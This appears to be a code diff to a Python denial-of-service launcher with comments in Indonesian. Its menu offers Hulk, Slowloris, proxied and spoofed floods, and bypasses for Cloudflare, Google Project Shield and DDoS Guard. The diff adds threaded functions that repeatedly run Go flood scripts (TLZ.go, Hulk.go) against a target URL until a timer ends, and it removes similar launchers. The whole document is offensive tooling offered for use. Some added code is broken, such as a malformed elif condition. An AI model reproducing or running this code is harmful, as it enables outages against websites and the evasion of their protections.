@@ -616,24 +616,6 @@ def AttackHULK(target, until_datetime, req):
         except:
             pass
 
-def LaunchHulk2(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=AttackHulk2, args=(url, until))
-            thd.start()
-        except:
-            pass
-
-def AttackHulk2(url, until_datetime):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            os.system(f'cd godzilla && go run Hulk.go -site {url} -data GET')
-        except IndexError:
-            #pass
-            print('coba cek lagi')
-            print('udah bener belum ngisi nya')
-
 
 # CFB
 def LaunchCFB(url, th, t):
@@ -1064,6 +1046,31 @@ def LaunchSTELLAR(url, timer):
         except:
             s.close()
 
+#tlz
+
+def Launchtlz(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=Attacktlz, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def Attacktlz(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
+        except IndexError:
+            #pass
+            print('coba cek lagi')
+            print('udah bener belum ngisi nya')
+
+
+
+
+
+
 ######################################################### bagian mesin habis ###########################################################################
 
 def clear():
@@ -1144,25 +1151,25 @@ def layer7_1():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╔═══════════╩════════════════════════════════════╩═════════╗\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"COMMAND"+Fore.LIGHTGREEN_EX+"    "+Fore.LIGHTWHITE_EX+"                     LIST                 "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"attack "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" HTTPS Sky Attack method without proxies  "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"strike "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" strike attack                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk   "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Hulk DoS tool                            "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxhulk "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Proxy Hulk DoS tool                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow "+Fore.LIGHTGREEN_EX+"     ║"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                   "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfpro  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"bypass "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"attack "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTPS Sky Attack method without proxies  "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"strike "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" strike attack                            "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk   "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Hulk DoS tool                            "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxhulk "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Hulk DoS tool                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"pxslow "+Fore.LIGHTGREEN_EX+"   ║"+Fore.LIGHTWHITE_EX+" Proxy Slowloris attack                   "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"╚══════════════════════════════════════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
@@ -1353,7 +1360,7 @@ def command():
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
-        LaunchHulk2(target, thread, t)
+        LaunchHulk(target, thread, t)
         timer.join()
     elif command == "pxhulk" or command == "PXHULK":
         target, thread, t = get_info_l7()
@@ -1455,31 +1462,16 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
-        
-    elif command == "tlz" or command == "TLZ":
-        target, thread, methode, t = get_info_l72()
-        timer = threading.Thread(target=countdown, args=(t,))
-        while true :
-            try :
-                os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
-            except IndexError:
-                print('coba cek dulu')
-                print('pelan pelan saja')
-        timer.start()
-        timer.join()
-        
-    elif command == "HTTPS-STORM" or command == "https-storm" :
-        target, methode, thread, t = get_info_l72()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timelol = time.time() + int(timer)
-        while time.time() < timelol:
-            try:
-                os.system(f'cd godzilla && go run HTTPS-STORM.go {target} {thread} {methode} {t} header.txt')
-            except IndexError:
-                print('Usage: HTTPS-STORM <url> <threads> <get/post> <seconds> <header.txt/nil')
-                print('Example: HTTPS-STORM https://example.com 500 <get/post> 125 <header.txt/nil')
-        timer.start()
-        timer.join()
+    
+    elif command == "hulk2" or command "HULK2"
+        try:
+            target, thread, t = get_info_l7()
+            os.system(f'cd godzilla && go run Hulk.go -site {target} -data GET')
+            #os.system(f'cd godzilla && go run strike.go -url [url] -method GET')
+            #os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
+            #os.system(f'cd godzilla && go run XCDDOS.go -site {url} -data GET')
+            #os.system(f'cd godzilla && go run Low.go -site {url} -data GET')
+            #os.system("clear")
 
 ##############################################################################################
 
